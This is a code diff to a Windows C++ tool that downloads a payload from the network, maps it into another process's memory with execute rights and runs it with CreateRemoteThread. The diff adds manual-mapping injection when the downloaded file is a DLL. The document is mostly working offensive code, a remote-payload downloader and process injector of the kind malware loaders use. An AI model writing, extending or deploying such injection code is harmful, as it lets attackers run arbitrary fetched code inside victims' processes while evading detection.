@@ -5,6 +5,7 @@
 #include <wininet.h>
 
 #include "proc.h"
+#include "dll-injector.h"
 
 #pragma comment (lib, "OneCore.lib")
 #pragma comment (lib, "wininet.lib")
@@ -61,6 +62,7 @@ int wmain(int argc, wchar_t* argv[]) {
 	LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_ALL_ACCESS, NULL, NULL, NULL);
 	char* startAddr = static_cast<char*> (lpMapAddress);
 
+	std::vector<char> fileBytes;
 	DWORD NumOfBytesRead = 0;
 	DWORD tmp;
 	char buf[512];
@@ -68,18 +70,25 @@ int wmain(int argc, wchar_t* argv[]) {
 	while (InternetReadFile(hFile, buf, size, &NumOfBytesRead) && NumOfBytesRead)
 	{
 		CopyMemory(startAddr, buf, size);
+		fileBytes.insert(fileBytes.end(), buf, buf + size);
 	}
 	
 	HANDLE hMapFile;
 	hMapFile = OpenFileMapping(FILE_MAP_ALL_ACCESS, TRUE, L"MEMORY");
 
 	LPVOID lpMapAddressRemote = MapViewOfFile2(hMapFile, hProc, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
-	HANDLE hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);
-	if (hRemoteThread == NULL)
-	{
-		std::cout << "Injection Failed! :(" << std::endl;
-		return -1;
-	}
+
+	 if (IsDllFile(fileBytes)) {
+        InjectByManualMapping(hProc, procId, fileBytes);
+	 }
+	 else {
+		 HANDLE hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);
+		 if (hRemoteThread == NULL)
+		 {
+			 std::cout << "Injection Failed! :(" << std::endl;
+			 return -1;
+		 }
+	 }
 
 
 	std::cout << "Injected into process!" << std::endl;
